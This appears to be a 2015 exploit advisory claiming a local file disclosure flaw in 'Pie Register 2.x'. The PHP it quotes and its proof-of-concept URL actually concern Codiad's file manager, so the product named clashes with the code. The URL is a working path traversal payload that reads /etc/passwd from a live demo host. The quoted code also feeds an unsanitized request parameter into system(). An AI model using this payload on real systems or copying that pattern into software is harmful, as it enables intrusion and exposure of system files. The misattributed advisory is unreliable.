[+]Author: TUNISIAN CYBER
[+]Date: 12/03/2015
[+]Type:WebApp
[+]Risk:High
[+]Overview:
Pie Register 2.x suffers, from a Local File Disclosure vulnerability.
  
[+]Proof Of Concept:
 
[PHP]
    //////////////////////////////////////////////////////////////////
    // Run Download
    //////////////////////////////////////////////////////////////////
 
    if(isset($_GET[&#039;type&#039;]) && ($_GET[&#039;type&#039;]==&#039;directory&#039; || $_GET[&#039;type&#039;]==&#039;root&#039;)){
        // Create tarball
        $filename = explode("/",$_GET[&#039;path&#039;]);
        //$filename = array_pop($filename) . "-" . date(&#039;Y.m.d&#039;) . ".tar.gz";
        $filename = array_pop($filename) . "-" . date(&#039;Y.m.d&#039;);
        $targetPath = DATA . &#039;/&#039;;
        $dir = WORKSPACE . &#039;/&#039; . $_GET[&#039;path&#039;];
        if(!is_dir($dir)){
            exit(&#039;<script>parent.codiad.message.error("Directory not found.")</script>&#039;);
        }
 
        //////////////////////////////////////////////////////////////////
        // Check system() command and a non windows OS
        //////////////////////////////////////////////////////////////////
        if(isAvailable(&#039;system&#039;) && stripos(PHP_OS, &#039;win&#039;) === false){
          # Execute the tar command and save file
          $filename .= &#039;.tar.gz&#039;;
 
          system("tar -pczf ".$targetPath.$filename." -C ".WORKSPACE." ".$_GET[&#039;path&#039;]);
          $download_file = $targetPath.$filename;
        }elseif(extension_loaded(&#039;zip&#039;)){ //Check if zip-Extension is availiable
          //build zipfile
          require_once &#039;class.dirzip.php&#039;;
 
          $filename .= &#039;.zip&#039;;
          $download_file = $targetPath.$filename;
          DirZip::zipDir($dir, $targetPath .$filename);
        }else{
          exit(&#039;<script>parent.codiad.message.error("Could not pack the folder, zip-extension missing")</script>&#039;);
        }
    }else{
        $filename = explode("/",$_GET[&#039;path&#039;]);
        $filename = array_pop($filename);
        $download_file = WORKSPACE . &#039;/&#039; . $_GET[&#039;path&#039;];
    }
[PHP]
 
 
http://demo.codiad.com/i/197156553/components/filemanager/download.php?path=../../../../../../../../../../../etc/passwd&type=undefined

